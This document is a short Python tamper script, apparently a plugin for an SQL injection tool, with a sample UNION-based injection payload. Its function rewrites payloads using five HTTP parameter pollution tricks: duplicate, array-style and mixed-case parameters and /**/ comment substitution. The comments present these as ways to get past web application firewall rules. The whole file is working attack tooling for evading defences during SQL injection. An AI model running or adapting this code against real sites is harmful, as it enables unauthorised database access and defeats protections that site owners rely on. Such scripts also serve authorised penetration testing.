import random

__example_payload__ = "' AND 1=1 UNION SELECT NULL--"
__type__ = "HPP multiple strategies: last-value, first-value, concatenation, and array-style pollution"


def tamper(payload, **kwargs):
    strategies = [
        # Strategy 1: Last-value wins (PHP, JSP)
        lambda p: "{0}&id={0}&id={0}".format(p),
        # Strategy 2: First-value wins (ASP.NET)
        lambda p: "{}&x=1".format(p),
        # Strategy 3: Array-style (PHP, Rails)
        lambda p: "{}&id[]={}".format(p, p.replace(" ", "/**/")),
        # Strategy 4: Comma concatenation (some frameworks join dup params with comma)
        lambda p: "{},1".format(p) if "," in p else "{}&id={}".format(p, p.lower()),
        # Strategy 5: Mixed-case duplicate (bypass case-sensitive WAF rules)
        lambda p: "{}&ID={}".format(p, p.swapcase()) if p else p,
    ]
    if payload:
        strategy = random.choice(strategies)
        return strategy(payload)
    return payload
